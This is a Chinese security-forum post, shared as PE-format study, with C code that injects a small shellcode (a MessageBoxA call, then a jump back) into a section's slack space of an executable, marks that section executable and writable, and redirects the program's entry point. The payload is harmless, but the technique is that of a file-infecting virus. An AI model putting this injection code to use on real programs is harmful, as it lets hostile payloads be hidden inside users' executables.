
# [分享]感染程序+复习PE

感谢滴水的培训视频，让我学到了很多知识。

程序的流程：文件状态(`FileBuffer`) -> 运行状态(`ImageBuffer`) -> 文件状态(`NewFileBuffer`) -> 存盘(新文件)。在运行状态中插入代码，然后修改程序入口点。

运行状态就是PE拉伸后的样子，有很多的地址需要注意，程序弄这么复杂就是为了复习PE知识。

![](https://bbs.kanxue.com/upload/attach/201902/822672_4MWCC8BSTD38M8M.png)

```
#define SHELLCODESIZE 18

#define INFECTPATH "C:\\Users\\Guxy\\Desktop\\3.exe"

//文件状态
LPVOID GetFileContent(char* FilePath);
//文件状态转运行状态  --  PE拉伸
LPVOID FileBufferTOImageBuffer(LPVOID FileBuffer);
//获取运行状态的PE文件在磁盘中的大小
DWORD szFileSize(LPVOID ImageBuffer);
//运行状态转文件状态
LPVOID ImageBufferTOFileBuffer(LPVOID ImageBuffer, DWORD FileSize);
//修改运行状态的数据
void ModifyingData(LPVOID ImageBuffer, DWORD ProcAddr);

char shellcode[] = 
{ 
	0x6A, 00, 0x6A, 00, 0x6A, 00, 0x6A, 00, 
	0xE8, 00, 00, 00, 00, 
	0xE9, 00, 00, 00, 00 
};
```

```
//文件中状态

LPVOID GetFileContent(char* FilePath)

{

	FILE* pFile = fopen(FilePath, "rb");

	if (pFile == NULL)

	{

		printf("Fopen File Error:%d\n", GetLastError());

		return 0;

	}

	fseek(pFile, 0, SEEK_END);

	DWORD FileSize = ftell(pFile);

	fseek(pFile, 0, SEEK_SET);



	LPVOID Filebuffer = malloc(FileSize);

	if (!Filebuffer)

	{

		printf("Malloc Error:%d\n", GetLastError());

		fclose(pFile);

		return 0;

	}

	memset(Filebuffer, 0, FileSize);



	if (!fread(Filebuffer, FileSize, 1, pFile))

	{

		printf("Fread Error:%d\n", GetLastError());

		free(Filebuffer);

		fclose(pFile);

		return 0;

	}



	fclose(pFile);

	return Filebuffer;

}
```

```
//文件状态转运行状态

LPVOID FileBufferTOImageBuffer(LPVOID FileBuffer)

{

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)FileBuffer;

	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((char*)FileBuffer + pDosHeader->e_lfanew);

	PIMAGE_SECTION_HEADER pec = (PIMAGE_SECTION_HEADER)((char*)FileBuffer + pDosHeader->e_lfanew + 24 + pNtHeader->FileHeader.SizeOfOptionalHeader);

        //PE文件在内存中的大小

	DWORD SizeOfImage = pNtHeader->OptionalHeader.SizeOfImage;

	LPVOID Imagebuff = malloc(SizeOfImage);

	if (!Imagebuff)

	{

		printf("FileBufferTOImageBuffer Malloc Error:%d\n", GetLastError());

		return 0;

	}



	memset(Imagebuff, 0, SizeOfImage);



	//复制所有头过去

	for (int i = 0; i < pNtHeader->OptionalHeader.SizeOfHeaders; i++)

	{

		*((char*)Imagebuff + i) = *((char*)FileBuffer + i);

	}



	//复制节，复制的位置是VirtualAddress 内存中的偏移，起始位置，从文件PointerToRawData 偏移处开始复制

	for (int m = 0; m < pNtHeader->FileHeader.NumberOfSections; m++, pec++)

	{

		for (int n = 0; n < pec->SizeOfRawData; n++)

		{

			*((char*)Imagebuff + pec->VirtualAddress + n) = *((char*)FileBuffer + pec->PointerToRawData + n);

		}

	}



	return Imagebuff;

}
```

```
//插入shellcode，修改程序入口地址  (注意有很多转换)

void ModifyingData(LPVOID ImageBuffer, DWORD ProcAddr)

{

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)ImageBuffer;

	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((char*)ImageBuffer + pDosHeader->e_lfanew);

	PIMAGE_SECTION_HEADER pec = (PIMAGE_SECTION_HEADER)((char*)ImageBuffer + pDosHeader->e_lfanew + 24 + pNtHeader->FileHeader.SizeOfOptionalHeader);



        //判断是否有空闲空间

	for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++, pec++)

	{

		if ((DWORD)(pec->SizeOfRawData) - (DWORD)(pec->VirtualAddress) > SHELLCODESIZE)

		{

			printf("%s\n", pec->Name);



                        //定位shellcode插入到哪里。 内存偏移VirtualAddress  + VirtualSize节在内存中的大小

			char* codeBegin = (char*)ImageBuffer + pec->VirtualAddress + pec->Misc.VirtualSize;

                        //插入数据

			for (int s = 0; s < SHELLCODESIZE; s++)

			{

				*((char*)codeBegin + s) = shellcode[s];

			}



                        //修正E8后面的地址  要跳往的地址 - E8所在的地址(内存中) - 5

                        //E8在内存中的偏移 = ImageBuffer - (codeBegin + 8) + ImageBase （ImageBuffer是拉伸后的状态，所以偏移跟运行状态的偏移是一样的)

			DWORD callAddr = (DWORD)ProcAddr - ((codeBegin + 8) - ImageBuffer + (pNtHeader->OptionalHeader.ImageBase)) - 5;



			*(DWORD*)((char*)codeBegin + 9) = callAddr;

                        //修正E9后面的地址，同上。

			DWORD jmpAddr = (pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase) - ((DWORD)codeBegin + 13 - (DWORD)ImageBuffer + pNtHeader->OptionalHeader.ImageBase) - 5;



			*(DWORD*)((char*)codeBegin + 14) = jmpAddr;



                        //修改节属性

			pec->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;





                        //修改入口点，也是偏移的计算。

			DWORD Oep = (DWORD)((char*)ImageBuffer + pec->VirtualAddress + pec->Misc.VirtualSize) - DWORD(ImageBuffer);



			pNtHeader->OptionalHeader.AddressOfEntryPoint = Oep;



			printf("Successful infection...\n");

			break;

		}

		else

		{

			printf("Insufficient space...\n");

			return;

		}

	}



	return;

}
```

```
//计算运行状态的PE文件在磁盘中的大小

//所有头的大小 + 所以节SizeOfRawData的大小

DWORD szFileSize(LPVOID ImageBuffer)

{

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)ImageBuffer;

	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((char*)ImageBuffer + pDosHeader->e_lfanew);

	PIMAGE_SECTION_HEADER pec = (PIMAGE_SECTION_HEADER)((char*)ImageBuffer + pDosHeader->e_lfanew + 24 + pNtHeader->FileHeader.SizeOfOptionalHeader);



	DWORD SectionsSize = 0;

	for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++)

	{

		SectionsSize = SectionsSize + pec[i].SizeOfRawData;

	}

	DWORD FileSize = pNtHeader->OptionalHeader.SizeOfHeaders + SectionsSize;



	return FileSize;

}
```

```
//运行状态转文件状态->存盘

//又是转换，地址定位

LPVOID ImageBufferTOFileBuffer(LPVOID ImageBuffer, DWORD FileSize)

{

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)ImageBuffer;

	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((char*)ImageBuffer + pDosHeader->e_lfanew);

	PIMAGE_SECTION_HEADER pec = (PIMAGE_SECTION_HEADER)((char*)ImageBuffer + pDosHeader->e_lfanew + 24 + pNtHeader->FileHeader.SizeOfOptionalHeader);



	LPVOID FileBuffer = malloc(FileSize);

	if (FileBuffer == NULL)

	{

		printf("ImageBufferTOFileBuffer Malloc Error:%d\n", GetLastError());

		return 0;

	}

	memset(FileBuffer, 0, FileSize);



	//Headers Copy

	for (int i = 0; i < pNtHeader->OptionalHeader.SizeOfHeaders; i++)

	{

		*((char*)FileBuffer + i) = *((char*)ImageBuffer + i);

	}



	//Sections Copy

	for (int n = 0; n < pNtHeader->FileHeader.NumberOfSections; n++, pec++)

	{

		for (int m = 0; m < pec->SizeOfRawData; m++)

		{

			*((char*)FileBuffer + pec->PointerToRawData + m) = *((char*)ImageBuffer + pec->VirtualAddress + m);

		}

	}





	FILE* pFile = fopen(INFECTPATH, "wb");



	fwrite(FileBuffer, FileSize, 1, pFile);



	fclose(pFile);



	return FileBuffer;

}
```

如果都没有空间的话，还可以自己新增一个节。里面少了`shellcode`要跳往的地址。

```
HMODULE Hmodule = LoadLibrary(L"User32.dll");

DWORD ProcAddr = (DWORD)GetProcAddress(Hmodule, "MessageBoxA");
```

因为我技术有限，现在还做不出通用的`shellcode`，谅解。

程序不方便理解，希望对正在学习PE的大哥有帮助。

非常感谢滴水培训视频！

![](https://bbs.kanxue.com/upload/attach/201902/822672_QGVRTMMBGANSM8X.png)

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [code.cpp](javascript:void(0);)（5.99kb，73次下载）
- [思路.png](javascript:void(0);)（5.57kb，35次下载）
